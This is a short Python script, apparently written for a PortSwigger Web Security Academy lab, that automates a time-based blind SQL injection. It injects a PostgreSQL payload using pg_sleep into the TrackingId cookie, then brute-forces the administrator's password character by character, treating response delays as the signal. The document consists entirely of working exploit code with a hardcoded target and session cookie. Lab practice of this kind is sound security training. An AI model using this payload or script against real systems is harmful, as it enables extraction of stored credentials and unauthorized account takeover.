
import pwn
from pwn import *
import requests, signal, time, pdb, sys, string


## Ctrl C
def def_handler(sig, frame):
    print("\n\n SALIENDO...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ab700970334cd4e84a52c0f00f90042.web-security-academy.net/"
characters= string.ascii_lowercase + string.digits

def makeRequest():

   
    result = "" 

    p1 = log.progress("Fuerza Bruta")
    p1.status("Have a nice day :3")
    
    
    time.sleep(2)

    p2 = log.progress("Passwordd")
    
    for position in range(1,21):
        
        ##BUCLE ANIDADO   500 Internal Server ERROR
        for character in characters:
            cookies = {
                'TrackingId' : "Lj0fPmgX0SfBnxYU'||select case when substring(password,%d,1)='%s' then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
                'session' : 'UAJmM1V9p61zIsfGImRSf2XkS7FwPZBu'
            }

            p1.status(cookies['TrackingId'])

            
            
            time_start = time.time()
            
            
            r = requests.get(main_url, cookies=cookies)
            
            
            time_end = time.time()
            
            
            if time_end - time_start > 5    :
                
                result += character
                p2.status(result)
                break
                

if __name__ =='__main__':

    makeRequest()

